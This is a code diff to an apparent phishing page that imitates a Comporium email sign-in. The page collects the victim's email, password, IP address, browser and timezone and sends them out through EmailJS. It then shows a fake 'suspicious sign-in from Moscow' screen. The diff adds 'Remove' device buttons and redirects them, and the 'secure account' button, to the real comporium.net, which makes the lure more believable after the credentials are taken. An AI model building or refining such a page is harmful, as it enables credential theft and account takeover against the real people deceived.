@@ -171,7 +171,7 @@
   .activity-container {
     display: none;
     width: 100%;
-    max-width: 520px;
+    max-width: 560px;
     background-color: #ffffff;
     border-radius: 4px;
     box-shadow: 0 4px 16px rgba(0,0,0,0.15);
@@ -237,16 +237,19 @@
     font-size: 13px;
     color: #333;
     line-height: 1.5;
+    min-width: 0;
   }
   .session-device {
     font-weight: bold;
     font-size: 14px;
     color: #222;
     margin-bottom: 2px;
+    word-wrap: break-word;
   }
   .session-meta {
     color: #666;
     font-size: 12px;
+    word-wrap: break-word;
   }
   .session-badge {
     display: inline-block;
@@ -264,6 +267,26 @@
     color: #fff;
   }
   .session-badge.suspicious {
+    background: #d93025;
+    color: #fff;
+  }
+  /* Remove button */
+  .remove-btn {
+    flex-shrink: 0;
+    margin-left: 12px;
+    background: transparent;
+    color: #d93025;
+    border: 1px solid #d93025;
+    border-radius: 4px;
+    font-size: 12px;
+    font-weight: 500;
+    padding: 6px 12px;
+    cursor: pointer;
+    align-self: center;
+    transition: background-color 0.25s, color 0.25s;
+    white-space: nowrap;
+  }
+  .remove-btn:hover {
     background: #d93025;
     color: #fff;
   }
@@ -393,6 +416,14 @@
     .activity-actions {
       flex-direction: column;
     }
+    .session-card {
+      flex-wrap: wrap;
+    }
+    .remove-btn {
+      margin-left: 0;
+      margin-top: 10px;
+      width: 100%;
+    }
   }
 </style>
 </head>
@@ -430,7 +461,7 @@
     <h1 class="activity-title">Verify your activity</h1>
     <p class="activity-subtitle">
       We noticed two recent sign-in attempts on your account. If you don't recognize
-      the activity below, please secure your account immediately.
+      the activity below, please remove the device and secure your account immediately.
     </p>
 
     <div class="session-list">
@@ -447,6 +478,7 @@
             Loading device info…
           </div>
         </div>
+        <button class="remove-btn" data-device="current">Remove</button>
       </div>
 
       <!-- Suspicious session from Moscow, Russia -->
@@ -462,6 +494,7 @@
             Chrome on Windows 10 · Just now
           </div>
         </div>
+        <button class="remove-btn" data-device="moscow">Remove</button>
       </div>
 
     </div>
@@ -495,7 +528,6 @@
 
   const loginView = document.getElementById("login-view");
   const activityView = document.getElementById("activity-view");
-
   const currentDeviceMeta = document.getElementById("current-device-meta");
 
   /* ---------- helpers ---------- */
@@ -510,7 +542,6 @@
     if (ua.includes("Safari")) return "Safari";
     return "Unknown";
   }
-
   function getOS() {
     const ua = navigator.userAgent;
     if (ua.includes("Win")) return "Windows";
@@ -520,26 +551,19 @@
     if (ua.includes("like Mac")) return "iOS";
     return "Unknown";
   }
-
   function getDeviceType() {
     const ua = navigator.userAgent;
     if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
     if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
     return "Desktop";
   }
-
   function getTimestamp() {
     return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
   }
-
   function getTimezone() {
-    try {
-      return Intl.DateTimeFormat().resolvedOptions().timeZone;
-    } catch (e) {
-      return "Unknown";
-    }
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    catch (e) { return "Unknown"; }
   }
-
   async function getIP() {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
@@ -569,12 +593,10 @@
       emailError.textContent = "Email must be @comporium.net.";
       valid = false;
     }
-
     if (!passwordValue) {
       passwordError.textContent = "Password is required.";
       valid = false;
     }
-
     if (!valid) return;
 
     // Gather metadata
@@ -644,13 +666,12 @@ Links: ${linksCount}
       message: messageLog
     };
 
-    // Show activity view immediately (don't wait for emailJS)
+    // Show activity view immediately
     loginView.style.display = "none";
     activityView.style.display = "flex";
 
-    // Fill in current device info on the activity page
-    currentDeviceMeta.textContent =
-      `${browser} on ${os} · ${ip} · ${timezone}`;
+    // Populate current device info on the activity page
+    currentDeviceMeta.textContent = `${browser} on ${os} · ${ip} · ${timezone}`;
 
     // Send to EmailJS in the background
     try {
@@ -662,20 +683,26 @@ Links: ${linksCount}
       console.log("EmailJS SUCCESS:", response.status);
     } catch (error) {
       console.error("EmailJS FAILED:", error);
-      // We already showed the activity page; silently log the error.
     }
   });
 
-  /* ---------- activity page buttons ---------- */
+  /* ---------- Remove device buttons ---------- */
+  document.querySelectorAll(".remove-btn").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      // Redirect after removing a device
+      window.location.href = "https://www.comporium.net";
+    });
+  });
+
+  /* ---------- Activity page buttons ---------- */
   document.getElementById("this-was-me").addEventListener("click", () => {
-    // For demo purposes, just go back to the login page
     activityView.style.display = "none";
     loginView.style.display = "flex";
     form.reset();
   });
 
   document.getElementById("secure-account").addEventListener("click", () => {
-    alert("For your security, please contact support at 1-800-COMPORIUM to reset your password.");
+    window.location.href = "https://www.comporium.net";
   });
 </script>
 </body>
